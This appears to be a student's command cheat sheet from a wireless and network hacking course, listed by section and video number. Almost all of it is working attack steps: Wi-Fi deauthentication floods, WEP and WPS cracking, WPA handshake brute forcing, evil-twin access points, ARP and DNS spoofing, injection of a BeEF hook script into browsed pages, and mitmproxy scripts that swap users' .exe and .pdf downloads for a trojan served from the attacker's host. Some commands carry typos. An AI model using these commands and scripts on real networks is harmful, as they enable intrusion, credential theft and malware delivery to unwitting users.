1) airodump-ng --channel 11 --bssid 64:7C:34:A4:BB:B2

2) aireplay-ng --deauth 100000 -a 64:7C:34:A4:BB:B2 -c 00:21:27:FD:61:06 mon0

3) aireplay-ng --deauth 100000 -a 64:7C:34:A4:BB:B2 -c 00:21:27:FD:61:06 mon0 &> /dev/null $

4) jobs

5) killall aireplay-ng 

6) kill %1

Section - 3 (Gaining Access) 

1) airodump-ng --bssid 64:16:F0:EC:7B:F3 --channel 6 mon0 

2) aireplay-ng --deauth 4 -a 64:16:F0:EC:7B:F3 -c 80:E6:50:22:A2:E8 mon0 

v-12

3) airmon-ng stop wlan0mon

or 

3) iwconfig mon0 mode managed 

4) service network-manager start 


v-13)

5) airodump-ng mon0

6) airodump-ng --bssid 64:16:F0:EC:7B:F3 --channel 6 mon0 

7) ifconfig wlano down 

8) macchanger -m 80:E6:50:22:A2:E8 wlan0 

v-14)

9) airodump-ng mon0 

10) airodump-ng --bssid 00:10:18:90:2D:EE --channel 1 --write ska-test mon0

11) aireplay-ng --fakeauth 0 -a 00:10:18:90:2D:EE -h 00:C0:CA:82:82:98 mon0 

12) ifconfig mon0 

13) airodump-ng --bssid 00:10:18:90:2D:EE --channel 1 --write ska-test2 mon0 

14) aireplay-ng --arpreplay -b 00:10:18:90:2D:EE -h 80:E6:50:22:A2:E8 mon0 

15) aircrack-ng ska-test2-01.cap

Section -4 

1) ifconfig 

2) ifconfig wlan0 down 

3) iwconfig wlan0 mode monitor 

4) ifconfig wlan0 up

5) airodump-ng wlan0 

6) airodump-ng --bssid 50:C7:BF:ED:6B:12 --channel 12 --write airport wlan0 

7) wireshark 

v-17)

8) mitmf --arp --spoof -i wlan0 --gateway 192.168.2.1 

9) route -n 

10) ettercap -Tq -M arp:remote -i wlan0 ///

11) q // quit wireshark using quit in the keyboard 

v-18)

 Nothing 

v-19)

12) service apache2 start 

13) apt-get install geany

v-23)

14) apt-get install hostapd dnsmasq

15) ifconfig 

16) service network-manager stop

v-24)

17) dnsmasq -C /root/downloads/fake-ap/dnsmasq.conf 

18) hostapd /root/Downloads/fake-ap/hostapd.conf -B 

19) ifconfig wlan0 10.0.0.1 netmask 255.255.255.0

20) service apache2 start

v-25)

21) leafpad /etc/apache2/sites-enabled/000-default.conf 

22) service apache2 restart 

v-26)

23) openssl req -new -x509 -days 365 -out /root/Downloads/fake-ap/cert.pem -keyout /root/Downloads/fake-ap/cert.key                               

v-27)

24) a2enmod ssl 

25) leafpad /etc/apache2/sites-enabled/00-default.conf 

26) leafpad /etc/apache2/ports.conf 


v-28)

27) hostpad /root/Downloads/fake-ap/hostapd.conf -B 

28) tshark -i wlan0 -w royal-wifi.cap

29) wireshark 


Section -5

1) wash -i mon0 

2) reaver --bssid 5C:A8:6A:16:A0:4C --channel 11 -i mon0 

3) aireplay-ng --fakeauth 100 -a 5C:A8:6A:16:A0:4C -h 00:C0:CA:82:82:98 mon0                

4) ifconfig mon0

5) reaver --bssid 5C:A8:6A:16:A0:4C --channel 11 -i mon0 -A 

6) reaver --bssid 5C:A8:6A:16:A0:4C --channel 11 -i mon0 -A -vvv

7) aireplay-ng --faekauth 100 -a 5C:A8:6A:16:A0:4C -h 00:C0:CA:82:82:98 mon0 

8) reaver --bssid 5C:A8:6A:16:A0:4C --channel 11 -i mon0 -A -vvv --no-nacks 


v-33)

9) wash -i mon0 

10) reaver -b 00:10:18:90:2D:EE -c 11 -i mon0 

11) reaver -b 54:67:51:C8:D4:10 -c 6 -i mon0 

12) aireplay-ng --deauth 10000000000 -a 54:67:51:C8:D4:10 -i mon0 

13) mdk3 -i mon0 a -a 54:67:51:C8:D4:10 -m 

14) reaver -b 54:67:51:C8:D4:10 -c 6 -i mon0 


Section - 6

v-35)

1) aircrack-ng handshake-01.cap -w wpa-wordlist 

2) john --wordlist=wpa-wordlist --stdout

3) john --wordlist=wpa-wordlist --stdout --session=upc | aircrack-ng -w - -b 00:10:18:90:2D:EE handshake-01.cap

4) john --restore=upc | aircrack-ng -w - -b 00:10:18:90:2D:EE handshake-01.cap

v-36)

5) crunch 8 8 -o all.txt

6) crunch 8 8

7) crunch 8 8 | aircrack-ng -b 00:10:18:90:2D:EE -w - handshake-01.cap

v-37)

8) crunch 8 8 | john --stdin --session=session1 --stdout | aircrack-ng -b 00:10:18:90:2D:EE -w - handshake-01.cap

9) crunch 8 8 | john --restore=session1 | aircrack-ng -b 00:10:18:90:2D:EE -w - handshake-01.cap

v-39)

10) hashcat64.exe --help

11) hashcat64.exe -m 2500 -d 1 handshake.hccapx rockyou.txt

section -7 

v-40)

1) route -n 

v-41) 

2) git clone fluxion.git
  
3) cd opt 

4) cd fluxion

5) cd install

6) bash instal.sh

7) cd..

8) bash fluxion.sh

v-42)

9) cd /opt/fluxion

10) bash fluxion.sh

section -8

v-46)

1) apt-get update 

2) apt-get installl hastapd-wpe

3) leafpad /etc/hostapd-wpe/hostapd-wpe.conf 

4) service network-manager stop

5) hostapd-wpe /etc/hostapd-wpe/host-wpe.conf

v-47)

6) asleap --help

7) asleap -C a5:5e:3a:5f:4b:d8:db:ff -R ee:25:4c:8b:84:f8:38:9b:4a:a2:ad:e3:66:87:a3:b7:f1:ba:ba:f2:b0:36:fa:cd -W /root/wordlist

section -9)

v-50)

1) leafpad /etc/ettercap/etter.conf

2) ettercap --help 

3) ettercap -Tq ///

v-51)

4) ifconfig eth0

5) ettercap -Tq -M arp:remote -i eth0 /10.20.215.1// /10.20.215.9//

6) arp -a

v-52)

7) ifconfig

8) ettercap -Tq -M arp:remote -i wlan0 -S ///

v-53)

9) leafpad /etc/ettercap/etter.dns

10) service apache2 start

11) ettercap -Tq -M arp:remote -i wlan0 -S -P dns_spoof /192.168.2.3// /192.168.2.1//

v-54)

12) ettercap -Tq -M arp:oneway -i eth0 -S /10.20.215.9// /10.20.215.1//

13) wireshark &

section-10)

v-56)

14) cd /opt/mitmproxy/

v-60)

15) ettercap -Tq -M arp:remote -i eth0 -S /10.20.215.9// /10.20.215.1//

16) iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

17) ./mitmweb --transparent 

18) iptables -t nat --flush

v-62)

19) ./mitmdump --transparent --replace :~bs:"</body>":"<script src="http://10.20.215.8:3000/hook.js"></script></body>"

20) ./mitmdump --transparent --replace :~s:"</body>":"<script src="http://10.20.215.8:3000/hook.js"></script></body>"

v-64)

21) agents 

22) interact 5UG8HVK1

23) sysinfo

section - 11)

v-66)

import mitmproxy

1)

def request(flow):
    #code to handle request flows
    print("[+] This is a request flow")
    print(flow)
def response(flow):
    #code to handle response flows
    print("[+] This is a repsonse flow")
    print(flow)


2) ./mitmdump -s /root/basic.py 

v-67

3)

import mitmproxy

def request(flow):
    print("[+] This is a request flow")
    print(flow.request)


4) ./mitmdump -s /root/basic.py

v-68)

5) 

import mitmproxy

def request(flow):
   print("[+] This is a request flow")
   print(flow.request.pretty_url)

6) ./mitmdump -s /root/basic.py

7) 

import mitmproxy

def request(flow):
    if flow.request.pretty_url.endswith(".exe")
        print("[+] Got interesting flow")
        print(flow)

v-69)

8)

import mitmproxy

def request(flow):
   if flow.request.pretty_url.endswith(".exe")
       print("[+] Got interseting flow")
       mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.20.215.8/file.exe"})


v-70)

9) 

import mitmproxy

def request(flow):
    if flow.request.pretty_url.endswith(".exe")
       print("[+] Got interesting flow")
       flow.reponse = mitmproxy.http.HTTPResponse.make(301,"",{"Location":"http://10.20.215.8/file.exe"})


10) 

import mitmproxy

def request(flow):
   if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".exe"):
       print(Got interesting flow")
       flow.response = mitmproxy.http.HTTPResponse.make(301,"",{"Location":"http://10.20.215.8/file.exe"})



11) wine autoit-v3-setup.exe

12) cd /opt

13) git clone https://github.com/TrojanFactory.git

14) cd TrojanFactory/

15) python trojan_factory.py --help

v-72)

16) python trojan_factory.py -f direct_url.pdf -e http://10.20.215.8/evil.exe -o /var/www/html/Readme.exe -i /root/Downloads/pdf.ico         

17) python trojan_factory.py -f direct_url.pdf -e http://10.20.215.8/evil.exe -o /var/www/html/Readme.exe -i /root/Downloads/pdf.ico  -z
  
v-73)

18) 

import mitmproxy 

def request(flow):
    if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".pdf")
       print()


19) ettercap -Tq -M arp:remote -i eth0 -S /10.20.215.1// /10.20.215.9//

20) ./mitmdump -s /root/basic.py --transparent 

21) iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 

v-74)

22) 

import mitmproxy 

def request(flow):
   
   if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".exe"):
       print("[+] Got interesting flow")

        
       subprocess.call("python /opt/TrojanFactory/trojan_factory.py -f direct_url.pdf -e http://10.20.215.8/evil.exe -o /var/www/html/Readme.exe -i /root/Downloads/pdf.ico",shell=True)
       flow.response = mitmproxy.http.HTTPResponse.make(301, "",{"Location":"http://10.20.215.8/file.exe"})   


v-75)

23) 

import mitmproxy 
import subprocess

def request(flow):
   
   if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".exe"):
       print("[+] Got interesting flow")

       front_file = flow.request.pretty_url + "#"    
       subprocess.call("python /opt/TrojanFactory/trojan_factory.py -f '" + front_file + "' -e http://10.20.215.8/evil.exe -o /var/www/html/Readme.exe -i /root/Downloads/pdf.ico",shell=True)
       flow.response = mitmproxy.http.HTTPResponse.make(301, "",{"Location":"http://10.20.215.8/file.exe"})   

24)

import mitmproxy 
import subprocess

def request(flow):
   
   if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".pdf"):
       print("[+] Got interesting flow")

       front_file = flow.request.pretty_url + "#"    
       subprocess.call("python /opt/TrojanFactory/trojan_factory.py -f '" + front_file + "' -e http://10.20.215.8/evil.exe -o /var/www/html/Readme.exe -i /root/Downloads/pdf.ico",shell=True)
       flow.response = mitmproxy.http.HTTPResponse.make(301, "",{"Location":"http://10.20.215.8/file.exe"})

       